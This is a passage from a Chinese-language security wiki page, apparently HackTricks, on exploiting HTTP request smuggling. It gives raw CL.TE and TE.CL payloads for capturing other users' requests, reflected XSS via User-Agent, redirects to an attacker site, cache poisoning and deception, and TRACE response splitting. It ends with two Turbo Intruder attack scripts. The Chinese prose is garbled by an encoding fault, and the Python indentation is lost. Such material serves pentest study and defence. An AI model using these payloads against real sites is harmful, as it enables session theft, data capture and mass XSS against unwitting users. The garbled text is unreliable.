ç›¸åï¼Œåœ¨TE.CLæ”»å‡»ä¸­ï¼Œåˆå§‹çš„`POST`è¯·æ±‚ä½¿ç”¨`Transfer-Encoding: chunked`ï¼Œè€Œåç»­åµŒå…¥çš„è¯·æ±‚åˆ™åŸºäº`Content-Length`å¤´è¿›è¡Œå¤„ç†ã€‚ç±»ä¼¼äºCL.TEæ”»å‡»ï¼Œå‰ç«¯ä»£ç†å¿½ç•¥äº†æºå¸¦çš„`GET /admin`è¯·æ±‚ï¼Œæ— æ„ä¸­æˆäºˆå¯¹å—é™`/admin`è·¯å¾„çš„è®¿é—®æƒé™ã€‚

### æ­ç¤ºå‰ç«¯è¯·æ±‚é‡å†™ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

åº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨**å‰ç«¯æœåŠ¡å™¨**åœ¨å°†è¯·æ±‚ä¼ é€’ç»™åç«¯æœåŠ¡å™¨ä¹‹å‰ä¿®æ”¹ä¼ å…¥è¯·æ±‚ã€‚å…¸å‹çš„ä¿®æ”¹åŒ…æ‹¬æ·»åŠ å¤´éƒ¨ï¼Œä¾‹å¦‚`X-Forwarded-For: <å®¢æˆ·ç«¯çš„IP>`ï¼Œä»¥å°†å®¢æˆ·ç«¯çš„IPä¼ é€’ç»™åç«¯ã€‚äº†è§£è¿™äº›ä¿®æ”¹å¯èƒ½è‡³å…³é‡è¦ï¼Œå› ä¸ºè¿™å¯èƒ½æ­ç¤ºäº†**ç»•è¿‡ä¿æŠ¤**æˆ–**æ­ç¤ºéšè—ä¿¡æ¯æˆ–ç«¯ç‚¹**çš„æ–¹æ³•ã€‚

è¦è°ƒæŸ¥ä»£ç†å¦‚ä½•ä¿®æ”¹è¯·æ±‚ï¼Œè¯·æŸ¥æ‰¾åç«¯åœ¨å“åº”ä¸­å›æ˜¾çš„POSTå‚æ•°ã€‚ç„¶åï¼Œåˆ¶ä½œä¸€ä¸ªè¯·æ±‚ï¼Œå°†æ­¤å‚æ•°æ”¾åœ¨æœ€åï¼Œç±»ä¼¼äºä»¥ä¸‹å†…å®¹ï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
åœ¨è¿™ç§ç»“æ„ä¸­ï¼Œåç»­è¯·æ±‚ç»„ä»¶è¢«é™„åŠ åœ¨`search=`ä¹‹åï¼Œè¿™æ˜¯åœ¨å“åº”ä¸­åæ˜ çš„å‚æ•°ã€‚è¿™ç§åå°„å°†æš´éœ²åç»­è¯·æ±‚çš„æ ‡å¤´ã€‚

é‡è¦çš„æ˜¯å°†åµŒå¥—è¯·æ±‚çš„`Content-Length`æ ‡å¤´ä¸å®é™…å†…å®¹é•¿åº¦å¯¹é½ã€‚å»ºè®®ä»ä¸€ä¸ªå°å€¼å¼€å§‹é€æ¸å¢åŠ ï¼Œå› ä¸ºå€¼è¿‡ä½å°†æˆªæ–­åæ˜ çš„æ•°æ®ï¼Œè€Œå€¼è¿‡é«˜å¯èƒ½ä¼šå¯¼è‡´è¯·æ±‚å‡ºé”™ã€‚

è¿™ç§æŠ€æœ¯ä¹Ÿé€‚ç”¨äºTE.CLæ¼æ´ï¼Œä½†è¯·æ±‚åº”ä»¥`search=\r\n0`ç»“æŸã€‚æ— è®ºæ¢è¡Œç¬¦æ˜¯ä»€ä¹ˆï¼Œè¿™äº›å€¼éƒ½å°†é™„åŠ åˆ°æœç´¢å‚æ•°ã€‚

è¿™ç§æ–¹æ³•ä¸»è¦ç”¨äºäº†è§£å‰ç«¯ä»£ç†æ‰€åšçš„è¯·æ±‚ä¿®æ”¹ï¼Œå®è´¨ä¸Šæ˜¯æ‰§è¡Œè‡ªæˆ‘å¯¼å‘çš„è°ƒæŸ¥ã€‚

### æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

é€šè¿‡å°†ç‰¹å®šè¯·æ±‚é™„åŠ ä¸ºå‚æ•°å€¼æ¥æ•è·ä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚æ˜¯å¯è¡Œçš„ã€‚åœ¨è¿›è¡ŒPOSTæ“ä½œæ—¶ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°è¿™ä¸€ç‚¹ï¼š

é€šè¿‡å°†ä»¥ä¸‹è¯·æ±‚é™„åŠ ä¸ºå‚æ•°å€¼ï¼Œæ‚¨å¯ä»¥å­˜å‚¨åç»­å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼š
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**commentå‚æ•°**æ—¨åœ¨å­˜å‚¨å…¬å¼€é¡µé¢ä¸Šè¯„è®ºéƒ¨åˆ†ä¸­çš„å†…å®¹ã€‚å› æ­¤ï¼Œéšåçš„è¯·æ±‚å†…å®¹å°†æ˜¾ç¤ºä¸ºè¯„è®ºã€‚

ç„¶è€Œï¼Œè¿™ç§æŠ€æœ¯æœ‰å±€é™æ€§ã€‚é€šå¸¸ï¼Œå®ƒä»…æ•è·ç›´åˆ°è¢«ç”¨äºä¼ªé€ è¯·æ±‚çš„å‚æ•°åˆ†éš”ç¬¦ä¸ºæ­¢çš„æ•°æ®ã€‚å¯¹äºURLç¼–ç çš„è¡¨å•æäº¤ï¼Œè¿™ä¸ªåˆ†éš”ç¬¦æ˜¯`&`å­—ç¬¦ã€‚è¿™æ„å‘³ç€ä»å—å®³ç”¨æˆ·è¯·æ±‚ä¸­æ•è·çš„å†…å®¹å°†åœ¨ç¬¬ä¸€ä¸ª`&`å¤„åœæ­¢ï¼Œç”šè‡³å¯èƒ½æ˜¯æŸ¥è¯¢å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚

æ­¤å¤–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ–¹æ³•åœ¨å­˜åœ¨TE.CLæ¼æ´æ—¶ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·æ±‚åº”ä»¥`search=\r\n0`ç»“å°¾ã€‚æ— è®ºæ¢è¡Œç¬¦æ˜¯ä»€ä¹ˆï¼Œå€¼éƒ½å°†é™„åŠ åˆ°æœç´¢å‚æ•°ä¸Šã€‚

### åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§æ¥åˆ©ç”¨åå°„å‹XSS

HTTPè¯·æ±‚èµ°ç§å¯ç”¨äºåˆ©ç”¨æ˜“å—**åå°„å‹XSS**æ”»å‡»çš„ç½‘é¡µï¼Œæä¾›é‡è¦ä¼˜åŠ¿ï¼š

* **æ— éœ€ä¸ç›®æ ‡ç”¨æˆ·äº¤äº’**ã€‚
* å…è®¸åˆ©ç”¨é€šå¸¸**æ— æ³•è·å–**çš„è¯·æ±‚éƒ¨åˆ†ä¸­çš„XSSï¼Œå¦‚HTTPè¯·æ±‚å¤´ã€‚

åœ¨ç½‘ç«™å®¹æ˜“é€šè¿‡ç”¨æˆ·ä»£ç†æ ‡å¤´å—åˆ°åå°„å‹XSSæ”»å‡»çš„æƒ…å†µä¸‹ï¼Œä»¥ä¸‹æœ‰æ•ˆè½½è·æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´ï¼š
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
è¿™ä¸ª payload çš„ç»“æ„ç”¨äºåˆ©ç”¨æ¼æ´ï¼š

1. å‘èµ·ä¸€ä¸ª `POST` è¯·æ±‚ï¼Œçœ‹ä¼¼å…¸å‹ï¼Œå¸¦æœ‰ä¸€ä¸ª `Transfer-Encoding: chunked` å¤´éƒ¨æ¥æŒ‡ç¤ºå¼€å§‹è¿›è¡Œèµ°ç§ã€‚
2. æ¥ç€æ˜¯ä¸€ä¸ª `0`ï¼Œæ ‡è®°ç€åˆ†å—æ¶ˆæ¯ä½“çš„ç»“æŸã€‚
3. ç„¶åï¼Œå¼•å…¥ä¸€ä¸ªèµ°ç§çš„ `GET` è¯·æ±‚ï¼Œå…¶ä¸­ `User-Agent` å¤´éƒ¨è¢«æ³¨å…¥äº†ä¸€ä¸ªè„šæœ¬ `<script>alert(1)</script>`ï¼Œå½“æœåŠ¡å™¨å¤„ç†è¿™ä¸ªåç»­è¯·æ±‚æ—¶è§¦å‘ XSSã€‚

é€šè¿‡èµ°ç§æ¥æ“çºµ `User-Agent`ï¼Œpayload èƒ½å¤Ÿç»•è¿‡æ­£å¸¸è¯·æ±‚çš„é™åˆ¶ï¼Œä»è€Œä»¥éæ ‡å‡†ä½†æœ‰æ•ˆçš„æ–¹å¼åˆ©ç”¨åå°„å‹ XSS æ¼æ´ã€‚

#### HTTP/0.9

{% hint style="danger" %}
å¦‚æœç”¨æˆ·å†…å®¹åœ¨å“åº”ä¸­åå°„ï¼Œä¸”å…·æœ‰è¯¸å¦‚ **`text/plain`** è¿™æ ·çš„ **`Content-type`**ï¼Œå¯èƒ½ä¼šé˜»æ­¢ XSS çš„æ‰§è¡Œã€‚å¦‚æœæœåŠ¡å™¨æ”¯æŒ **HTTP/0.9ï¼Œå¯èƒ½å¯ä»¥ç»•è¿‡è¿™ä¸ªé™åˆ¶**ï¼
{% endhint %}

HTTP/0.9 ç‰ˆæœ¬å…ˆäº 1.0 ç‰ˆæœ¬å‡ºç°ï¼Œåªä½¿ç”¨ **GET** åŠ¨è¯ï¼Œä¸”**ä¸**ä¼šå“åº” **å¤´éƒ¨**ï¼Œåªæœ‰ä¸»ä½“ã€‚

åœ¨[**è¿™ç¯‡æ–‡ç« **](https://mizu.re/post/twisty-python)ä¸­ï¼Œé€šè¿‡è¯·æ±‚èµ°ç§å’Œä¸€ä¸ª**ä¼šå°†ç”¨æˆ·è¾“å…¥ä½œä¸ºå“åº”è¿”å›çš„æ˜“å—æ”»å‡»çš„ç«¯ç‚¹**ï¼Œæ»¥ç”¨äº† HTTP/0.9ã€‚å°†åœ¨å“åº”ä¸­åæ˜ çš„å‚æ•°åŒ…å«äº†ä¸€ä¸ª**ä¼ªé€ çš„ HTTP/1.1 å“åº”ï¼ˆå¸¦æœ‰å¤´éƒ¨å’Œä¸»ä½“ï¼‰**ï¼Œå› æ­¤å“åº”å°†åŒ…å«å…·æœ‰ `Content-Type` ä¸º `text/html` çš„æœ‰æ•ˆå¯æ‰§è¡Œ JS ä»£ç ã€‚

### åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§å¯¹ç«™ç‚¹é‡å®šå‘è¿›è¡Œåˆ©ç”¨ <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

åº”ç”¨ç¨‹åºé€šå¸¸é€šè¿‡åœ¨é‡å®šå‘ URL ä¸­ä½¿ç”¨ `Host` å¤´éƒ¨ä¸­çš„ä¸»æœºåä»ä¸€ä¸ª URL é‡å®šå‘åˆ°å¦ä¸€ä¸ªã€‚è¿™åœ¨åƒ Apache å’Œ IIS è¿™æ ·çš„ Web æœåŠ¡å™¨ä¸­å¾ˆå¸¸è§ã€‚ä¾‹å¦‚ï¼Œè¯·æ±‚ä¸€ä¸ªæ²¡æœ‰å°¾éšæ–œæ çš„æ–‡ä»¶å¤¹ä¼šå¯¼è‡´é‡å®šå‘ä»¥åŒ…å«æ–œæ ï¼š
```
GET /home HTTP/1.1
Host: normal-website.com
```
ç»“æœå¦‚ä¸‹ï¼š
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
å°½ç®¡çœ‹ä¼¼æ— å®³ï¼Œä½†è¿™ç§è¡Œä¸ºå¯ä»¥é€šè¿‡HTTPè¯·æ±‚èµ°ç§æ¥æ“çºµï¼Œå°†ç”¨æˆ·é‡å®šå‘åˆ°å¤–éƒ¨ç½‘ç«™ã€‚ä¾‹å¦‚ï¼š
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
è¿™ç§èµ°ç§è¯·æ±‚å¯èƒ½å¯¼è‡´ä¸‹ä¸€ä¸ªå¤„ç†çš„ç”¨æˆ·è¯·æ±‚è¢«é‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ï¼š
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
ç»“æœå¦‚ä¸‹ï¼š
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### é€šè¿‡HTTPè¯·æ±‚èµ°ç§åˆ©ç”¨Webç¼“å­˜æŠ•æ¯’ <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

å¦‚æœ**å‰ç«¯åŸºç¡€è®¾æ–½çš„ä»»ä½•ç»„ä»¶ç¼“å­˜å†…å®¹**ï¼Œé€šå¸¸æ˜¯ä¸ºäº†æé«˜æ€§èƒ½ï¼Œé‚£ä¹ˆå¯ä»¥æ‰§è¡ŒWebç¼“å­˜æŠ•æ¯’ã€‚é€šè¿‡æ“çºµæœåŠ¡å™¨çš„å“åº”ï¼Œå¯ä»¥**æŠ•æ¯’ç¼“å­˜**ã€‚

ä¹‹å‰ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°æœåŠ¡å™¨å“åº”å¯ä»¥è¢«ä¿®æ”¹ä»¥è¿”å›404é”™è¯¯ï¼ˆå‚è§[åŸºæœ¬ç¤ºä¾‹](./#basic-examples)ï¼‰ã€‚ç±»ä¼¼åœ°ï¼Œå¯ä»¥æ¬ºéª—æœåŠ¡å™¨ï¼Œä½¿å…¶åœ¨å“åº”å¯¹`/static/include.js`çš„è¯·æ±‚æ—¶æä¾›`/index.html`å†…å®¹ã€‚å› æ­¤ï¼Œ`/static/include.js`çš„å†…å®¹è¢«`/index.html`çš„å†…å®¹æ›¿æ¢åœ¨ç¼“å­˜ä¸­ï¼Œä½¿å¾—ç”¨æˆ·æ— æ³•è®¿é—®`/static/include.js`ï¼Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚

å¦‚æœå‘ç°**å¼€æ”¾é‡å®šå‘æ¼æ´**æˆ–å­˜åœ¨**ç«™ç‚¹é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**ï¼Œåˆ™æ­¤æŠ€æœ¯å˜å¾—ç‰¹åˆ«å¼ºå¤§ã€‚å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´å°†`/static/include.js`çš„ç¼“å­˜å†…å®¹æ›¿æ¢ä¸ºå—æ”»å‡»è€…æ§åˆ¶çš„è„šæœ¬ï¼Œä»è€Œåœ¨æ‰€æœ‰è¯·æ±‚æ›´æ–°çš„`/static/include.js`çš„å®¢æˆ·ç«¯ä¸­å®æ–½å¹¿æ³›çš„è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ”»å‡»ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ©ç”¨**ç¼“å­˜æŠ•æ¯’ç»“åˆç«™ç‚¹é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**çš„ç¤ºä¾‹ã€‚ç›®æ ‡æ˜¯ä¿®æ”¹`/static/include.js`çš„ç¼“å­˜å†…å®¹ï¼Œä»¥æä¾›å—æ”»å‡»è€…æ§åˆ¶çš„JavaScriptä»£ç ï¼š
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
æ³¨æ„åµŒå…¥çš„è¯·æ±‚é’ˆå¯¹ `/post/next?postId=3`ã€‚è¯¥è¯·æ±‚å°†è¢«é‡å®šå‘åˆ° `/post?postId=4`ï¼Œåˆ©ç”¨**Host å¤´å€¼**æ¥ç¡®å®šåŸŸã€‚é€šè¿‡ä¿®æ”¹**Host å¤´**ï¼Œæ”»å‡»è€…å¯ä»¥å°†è¯·æ±‚é‡å®šå‘åˆ°ä»–ä»¬çš„åŸŸï¼ˆ**ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**ï¼‰ã€‚

æˆåŠŸè¿›è¡Œ**socket æ¯’åŒ–**åï¼Œåº”å‘èµ·å¯¹ `/static/include.js` çš„**GET è¯·æ±‚**ã€‚è¯¥è¯·æ±‚å°†å—åˆ°ä¹‹å‰çš„**ç«™å†…é‡å®šå‘åˆ°å¼€æ”¾é‡å®šå‘**è¯·æ±‚çš„å½±å“ï¼Œå¹¶è·å–æ”»å‡»è€…æ§åˆ¶çš„è„šæœ¬å†…å®¹ã€‚

éšåï¼Œä»»ä½•å¯¹ `/static/include.js` çš„è¯·æ±‚éƒ½å°†æä¾›æ”»å‡»è€…è„šæœ¬çš„ç¼“å­˜å†…å®¹ï¼Œæœ‰æ•ˆåœ°å‘èµ·å¹¿æ³›çš„ XSS æ”»å‡»ã€‚

### ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§æ‰§è¡Œ Web ç¼“å­˜æ¬ºéª— <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Web ç¼“å­˜æ¯’åŒ–å’Œ Web ç¼“å­˜æ¬ºéª—ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ**
>
> * åœ¨**Web ç¼“å­˜æ¯’åŒ–**ä¸­ï¼Œæ”»å‡»è€…å¯¼è‡´åº”ç”¨ç¨‹åºå°†ä¸€äº›æ¶æ„å†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œå¹¶å°†æ­¤å†…å®¹ä»ç¼“å­˜æä¾›ç»™å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚
> * åœ¨**Web ç¼“å­˜æ¬ºéª—**ä¸­ï¼Œæ”»å‡»è€…å¯¼è‡´åº”ç”¨ç¨‹åºå°†å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„ä¸€äº›æ•æ„Ÿå†…å®¹å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢æ­¤å†…å®¹ã€‚

æ”»å‡»è€…æ„é€ äº†ä¸€ä¸ªèµ°ç§è¯·æ±‚ï¼Œç”¨äºè·å–æ•æ„Ÿçš„ç‰¹å®šç”¨æˆ·å†…å®¹ã€‚è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼š
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
å¦‚æœè¿™ä¸ªèµ°ç§è¯·æ±‚æ¯’å®³äº†ä¸€ä¸ªç”¨äºé™æ€å†…å®¹çš„ç¼“å­˜æ¡ç›®ï¼ˆä¾‹å¦‚ï¼Œ`/someimage.png`ï¼‰ï¼Œå—å®³è€…çš„æ•æ„Ÿæ•°æ®å¯èƒ½ä¼šè¢«ç¼“å­˜åœ¨é™æ€å†…å®¹çš„ç¼“å­˜æ¡ç›®ä¸‹ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ½œåœ¨åœ°æ£€ç´¢è¿™äº›ç¼“å­˜çš„æ•æ„Ÿæ•°æ®ã€‚

### é€šè¿‡ HTTP è¯·æ±‚èµ°ç§æ»¥ç”¨ TRACE <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**åœ¨è¿™ç¯‡æ–‡ç« ä¸­**](https://portswigger.net/research/trace-desync-attack)å»ºè®®å¦‚æœæœåŠ¡å™¨å¯ç”¨äº† TRACE æ–¹æ³•ï¼Œå¯èƒ½ä¼šæ»¥ç”¨å®ƒè¿›è¡Œ HTTP è¯·æ±‚èµ°ç§ã€‚è¿™æ˜¯å› ä¸ºè¿™ä¸ªæ–¹æ³•ä¼šå°†å‘é€åˆ°æœåŠ¡å™¨çš„ä»»ä½•æ ‡å¤´ä½œä¸ºå“åº”ä¸»ä½“çš„ä¸€éƒ¨åˆ†åå°„å›å»ã€‚ä¾‹å¦‚ï¼š
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
å°†å‘é€ç±»ä¼¼ä»¥ä¸‹å“åº”ï¼š
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
ä¸€ä¸ªæ»¥ç”¨è¿™ç§è¡Œä¸ºçš„ç¤ºä¾‹æ˜¯**å…ˆå‘é€ä¸€ä¸ªHEADè¯·æ±‚**ã€‚è¿™ä¸ªè¯·æ±‚å°†åªè¿”å›ä¸€ä¸ªGETè¯·æ±‚çš„**å¤´éƒ¨**ï¼ˆå…¶ä¸­åŒ…æ‹¬**`Content-Type`**ï¼‰ã€‚ç„¶å**ç«‹å³åœ¨HEADè¯·æ±‚åå‘é€ä¸€ä¸ªTRACEè¯·æ±‚**ï¼Œè¿™ä¸ªè¯·æ±‚å°†**åå°„å‘é€çš„æ•°æ®**ã€‚\
ç”±äºHEADå“åº”å°†åŒ…å«ä¸€ä¸ª`Content-Length`å¤´éƒ¨ï¼Œ**TRACEè¯·æ±‚çš„å“åº”å°†è¢«è§†ä¸ºHEADå“åº”çš„ä¸»ä½“ï¼Œä»è€Œåœ¨å“åº”ä¸­åå°„ä»»æ„æ•°æ®**ã€‚\
è¿™ä¸ªå“åº”å°†è¢«å‘é€åˆ°è¿æ¥ä¸Šçš„ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼Œå› æ­¤è¿™å¯ä»¥è¢«**ç”¨åœ¨ç¼“å­˜çš„JSæ–‡ä»¶ä¸­ï¼Œä¾‹å¦‚æ³¨å…¥ä»»æ„JSä»£ç **ã€‚

### é€šè¿‡HTTPå“åº”æ‹†åˆ†æ»¥ç”¨TRACE <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

ç»§ç»­é˜…è¯»[**è¿™ç¯‡æ–‡ç« **](https://portswigger.net/research/trace-desync-attack)å»ºè®®å¦ä¸€ç§æ»¥ç”¨TRACEæ–¹æ³•çš„æ–¹å¼ã€‚æ­£å¦‚è¯„è®ºä¸­æ‰€è¿°ï¼Œé€šè¿‡ä¼ è¾“ä¸€ä¸ªHEADè¯·æ±‚å’Œä¸€ä¸ªTRACEè¯·æ±‚ï¼Œå¯ä»¥**æ§åˆ¶å“åº”ä¸­ä¸€äº›åå°„çš„æ•°æ®**ã€‚HEADè¯·æ±‚çš„ä¸»ä½“é•¿åº¦åŸºæœ¬ä¸Šåœ¨Content-Lengthå¤´éƒ¨ä¸­æŒ‡ç¤ºï¼Œå¹¶ç”±TRACEè¯·æ±‚çš„å“åº”ç»„æˆã€‚

å› æ­¤ï¼Œæ–°çš„æƒ³æ³•æ˜¯ï¼ŒçŸ¥é“è¿™ä¸ªContent-Lengthå’ŒTRACEå“åº”ä¸­ç»™å®šçš„æ•°æ®ï¼Œå¯ä»¥ä½¿TRACEå“åº”åœ¨Content-Lengthçš„æœ€åä¸€ä¸ªå­—èŠ‚ä¹‹ååŒ…å«ä¸€ä¸ªæœ‰æ•ˆçš„HTTPå“åº”ï¼Œä»è€Œä½¿æ”»å‡»è€…å®Œå…¨æ§åˆ¶å¯¹ä¸‹ä¸€ä¸ªå“åº”çš„è¯·æ±‚ï¼ˆè¿™å¯ä»¥ç”¨äºæ‰§è¡Œç¼“å­˜æŠ•æ¯’ï¼‰ã€‚

ç¤ºä¾‹ï¼š
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
å°†ç”Ÿæˆè¿™äº›å“åº”ï¼ˆè¯·æ³¨æ„ï¼ŒHEAD å“åº”å…·æœ‰ Content-Lengthï¼Œä½¿ TRACE å“åº”æˆä¸º HEAD ä¸»ä½“çš„ä¸€éƒ¨åˆ†ï¼Œä¸€æ—¦ HEAD Content-Length ç»“æŸï¼Œå°±ä¼šä¼ é€’æœ‰æ•ˆçš„ HTTP å“åº”ï¼‰:
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(â€œarbitrary responseâ€)</script>
```
### åˆ©ç”¨ HTTP è¯·æ±‚ä¸²è”ä¸ HTTP å“åº”è§£åŒæ­¥åŒ–è¿›è¡Œæ­¦å™¨åŒ–

æ‚¨æ˜¯å¦å‘ç°äº†ä¸€äº› HTTP è¯·æ±‚ä¸²è”æ¼æ´ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•åˆ©ç”¨å®ƒã€‚å°è¯•è¿™äº›å…¶ä»–åˆ©ç”¨æ–¹æ³•ï¼š

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### å…¶ä»– HTTP è¯·æ±‚ä¸²è”æŠ€æœ¯

* æµè§ˆå™¨ HTTP è¯·æ±‚ä¸²è”ï¼ˆå®¢æˆ·ç«¯ï¼‰

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* HTTP/2 é™çº§ä¸­çš„è¯·æ±‚ä¸²è”

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Turbo intruder è„šæœ¬

### CL.TE

æ¥æºï¼š[https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## å·¥å…·

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
